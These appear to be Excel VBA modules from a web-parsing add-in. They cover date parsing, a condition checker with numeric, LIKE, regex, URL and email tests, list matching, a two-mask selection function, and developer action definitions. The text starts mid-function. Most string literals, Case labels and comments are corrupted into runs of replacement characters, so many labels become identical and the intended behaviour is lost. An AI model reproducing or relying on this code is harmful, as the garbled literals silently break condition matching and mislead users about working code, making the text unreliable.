            .Pattern = ".*([0-9-]{10}).([0-9\:]{5,}).*"
            If .test(txt) Then
                txt = .Replace(txt, "$1 $2")
            End If
        End With
    End If

    txt$ = Application.Trim(Replace(txt, " |fffd| ", " "))
    If txt$ Like "#* [A-Za-z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|][A-Za-z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|][A-Za-z|fffd|-|fffd||fffd|-|fffd||fffd||fffd|]*" Then
        td$ = Format(txt$, "dd.mm.yyyy")
    Else
        td$ = Split(txt)(0)
    End If
    If InStr(1, txt, " ") > 0 Then tt$ = Split(txt)(UBound(Split(txt)))    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|

    If txt Like "*|fffd||fffd||fffd||fffd||fffd||fffd|*" Then GetDate = Now: Exit Function

    For Each word In Array("today", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        If txt Like "*" & word & "*" Then td$ = Date
    Next
    For Each word In Array("yesterday", "|fffd||fffd||fffd||fffd||fffd|")
        If txt Like "*" & word & "*" Then td$ = Date - 1
    Next
    For Each word In Array("before yesterday", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        If txt Like "*" & word & "*" Then td$ = Date - 2
    Next
    For Each word In Array("tomorrow", "|fffd||fffd||fffd||fffd||fffd||fffd|")
        If txt Like "*" & word & "*" Then td$ = Date + 1
    Next

    GetDate = CDate(td$)
    If Len(tt) Then If IsDate(tt) Then If CDate(tt$) < 1 Then GetDate = GetDate + CDate(tt$)
End Function

Function ConditionsList() As Variant
    ConditionsList = Array("|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|", _
                           "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", _
                           "LIKE", "NOT LIKE", "REGEXP", "NOT REGEXP", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", _
                           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "URL", "EMAIL")
End Function

Function CheckCondition(ByVal txt$, ByVal Condition$, Optional ByVal Pattern$) As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Condition$ |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| txt$ |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Pattern$
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (TRUE |fffd||fffd||fffd| FALSE)
    On Error Resume Next
    Select Case Condition$
        Case "|fffd||fffd||fffd||fffd||fffd|", "=": CheckCondition = txt$ = Pattern$
        Case "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", "!=": CheckCondition = txt$ <> Pattern$
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "INSTR": CheckCondition = InStr(1, txt$, Pattern$, vbTextCompare) > 0
        Case "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "!INSTR": CheckCondition = InStr(1, txt$, Pattern$, vbTextCompare) = 0
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|", "START": CheckCondition = InStr(1, txt$, Pattern$, vbTextCompare) = 1
        Case "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|", "!START": CheckCondition = InStr(1, txt$, Pattern$, vbTextCompare) <> 1
        Case "|fffd||fffd||fffd||fffd||fffd||fffd|", ">": CheckCondition = Val(Replace(Trim(txt$), ",", ".")) > Val(Replace(Trim(Pattern$), ",", "."))
        Case "|fffd||fffd||fffd||fffd||fffd||fffd|", "<": CheckCondition = Val(Replace(Trim(txt$), ",", ".")) < Val(Replace(Trim(Pattern$), ",", "."))
        Case "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", ">=": CheckCondition = Val(Replace(Trim(txt$), ",", ".")) >= Val(Replace(Trim(Pattern$), ",", "."))
        Case "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", "<=": CheckCondition = Val(Replace(Trim(txt$), ",", ".")) <= Val(Replace(Trim(Pattern$), ",", "."))
        Case "|fffd||fffd||fffd||fffd||fffd|", "< <":
            If Pattern$ Like "*;*" Then CheckCondition = (Val(Replace(Trim(txt$), ",", ".")) >= Val(Replace(Trim(Split(Pattern$, ";")(0)), ",", "."))) And _
               (Val(Replace(Trim(txt$), ",", ".")) <= Val(Replace(Trim(Split(Pattern$, ";")(1)), ",", ".")))
        Case "LIKE": CheckCondition = txt$ Like Pattern$
        Case "NOT LIKE": CheckCondition = Not (txt$ Like Pattern$)
        Case "REGEXP"
            With REGEXP: .Pattern = Pattern$: CheckCondition = .test(txt$): End With
        Case "NOT REGEXP"
            With REGEXP: .Pattern = Pattern$: CheckCondition = Not .test(txt$): End With
        Case "|fffd||fffd||fffd||fffd||fffd||fffd|", "aliquot": CheckCondition = (Val(Replace(Trim(txt$), ",", ".")) Mod Fix(Val(Pattern$)) = 0)
        Case "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "!aliquot": CheckCondition = (Val(Replace(Trim(txt$), ",", ".")) Mod Fix(Val(Pattern$)) > 0)
        Case "URL": CheckCondition = CheckCondition(txt$, "REGEXP", "^(https?|ftp)\:\/\/([a-z0-9]{1})((\.[a-z0-9-])|([a-z0-9-]))*\.([a-z]{2,6})(\/?).*")
        Case "EMAIL": CheckCondition = CheckCondition(txt$, "REGEXP", "^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$")
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|": CheckCondition = In_Array(txt$, Pattern$)
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|": CheckCondition = Not In_Array(txt$, Pattern$)
    End Select
End Function

Function In_Array(ByRef txt$, ByRef list$) As Boolean
    On Error Resume Next
    If list$ = "" Then Exit Function
    Dim arr, i&, FirstPart$
    FirstPart$ = Split(txt, "|")(0)
    Select Case True
        Case InStr(1, list$, ARSEP) > 0: arr = Split(list$, ARSEP)
        Case InStr(1, list$, vbNewLine) > 0: arr = Split(list$, vbNewLine)
        Case Else: arr = Array(list$)
    End Select
    For i = LBound(arr) To UBound(arr)
        If txt = arr(i) Then In_Array = True: Exit For
        If FirstPart$ = arr(i) Then In_Array = True: Exit For
        If txt Like arr(i) Then In_Array = True: Exit For
        If FirstPart$ Like arr(i) Then In_Array = True: Exit For
    Next i
End Function

Function ConditionalCommandsList() As Variant
    ConditionalCommandsList = Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                                    "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                                    "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
End Function

Function DoubleSelection(ByVal txt$, ByVal Mask1$, ByVal Mask2$, Optional ByVal Filters$, Optional ByVal ResultValues$) As String
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
    On Error Resume Next
    Dim msg$, LenTXT&, FilterApplied As Boolean

    If Filters$ Like "*=*" Then
        LenTXT& = Len(txt)
        txt$ = ApplyHTMLFilters(txt$, Filters$, msg$)        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        If Len(txt) < LenTXT& Then FilterApplied = True Else msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.<br />"
    End If

    Dim cond1 As Boolean, cond2 As Boolean, res1$, res2$, res3$, Mask As Variant, OK As Boolean
    If Len(Trim(ResultValues$)) Then
        res1$ = Split(ResultValues$, "|")(0)
        res2$ = Split(ResultValues$, "|")(1)
        res3$ = Split(ResultValues$, "|")(2)
    Else
        res1$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": res2$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": res3$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End If

    If Len(Mask1$) Then
        For Each Mask In Split(Mask1$, "|")
            cond1 = cond1 Or (txt Like "*" & Mask & "*")
        Next
    Else
        cond1 = txt = ""
    End If

    If Len(Mask2$) Then
        For Each Mask In Split(Mask2$, "|")
            cond2 = cond2 Or (txt Like "*" & Mask & "*")
        Next
    Else
        cond2 = txt = ""
    End If

    Select Case True
        Case cond1 And cond2: DoubleSelection = res3$: msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| #3 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|).<br />"
        Case cond1: DoubleSelection = res1$: OK = True
        Case cond2: DoubleSelection = res2$: OK = True
        Case (Mask1$ = "") And (Mask2 <> "")
            DoubleSelection = res1$: OK = True
            msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| #1 (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|).<br />"
        Case (Mask1$ <> "") And (Mask2 = "")
            DoubleSelection = res2$: OK = True
            msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| #2 (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|).<br />"

        Case Else: DoubleSelection = res3$: msg$ = msg$ & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| #3 (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|).<br />"
    End Select


ExitDoubleSelection:
    If Len(msg$) Then If TEST_ACTIONS_MODE Then AddBalloon msg$, IIf(OK, bt_Information, bt_Warning)
End Function


Attribute VB_Name = "mod_AAs_Developer"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_Developer                    Version:
' Author        : Igor Vakhnenko                   Date: 31.10.2017
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Binary: Option Private Module

Sub InitializeActions_Developer(ByRef AAs As ArrayActions)

    With AAs.AddAction(fc_Developer, "ParseSublevels", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| DIV, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| <div id=""level_name"">|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|</div>" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!"
        .AddParameter "Name", aps_RuntimeList, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "ActionSets"
    End With

    With AAs.AddAction(fc_Developer, "LevelParameters", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|ParseSublevels|fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Level", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4", "5", "6", "7", "8", "9"), "1"
        .AddParameter "Name", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Mask", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML"
        .AddParameter "Source", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("outerHTML", "innerHTML"), "outerHTML"
    End With

    With AAs.AddAction(fc_Developer, "ApplyReplaceTable", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Name", aps_RuntimeList, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", "ReplaceTables"
    End With

    With AAs.AddAction(fc_Developer, "OutputToSheet", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|, - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|! " & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) |fffd| " & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Developer, "CancelOutputToSheet", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Developer, "AddFormatConditionRule", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|! |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Columns", aps_Text, "|fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", , "4-8"
        .AddParameter "Formula", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| R1C1)", , "=RC=|fffd||fffd||fffd|(RC4:RC8)"
        .AddParameter "StopIfTrue", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
        .AddParameter "InteriorColor", aps_Combo, "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                      Array("14285281 (|fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", "16764159 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", "16442074 (|fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", _
